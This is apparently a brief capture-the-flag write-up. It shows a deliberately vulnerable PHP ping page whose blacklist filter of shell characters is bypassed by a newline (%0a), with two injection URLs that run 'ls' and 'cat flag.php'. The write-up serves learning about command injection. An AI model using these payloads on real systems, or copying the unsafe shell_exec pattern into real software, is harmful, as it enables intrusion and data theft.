### 源码
```php
<?php
if(isset($_REQUEST[ 'ip' ])) {
    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
        echo $target;
    echo  "<pre>{$cmd}</pre>";
}
show_source(__FILE__);
```
### Solution
%0a 即可绕过
```
http://XXXX:83/index.php?ip=127.0.0.1%0als
http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php
```

![](Pasted%20image%2020230514213043.png)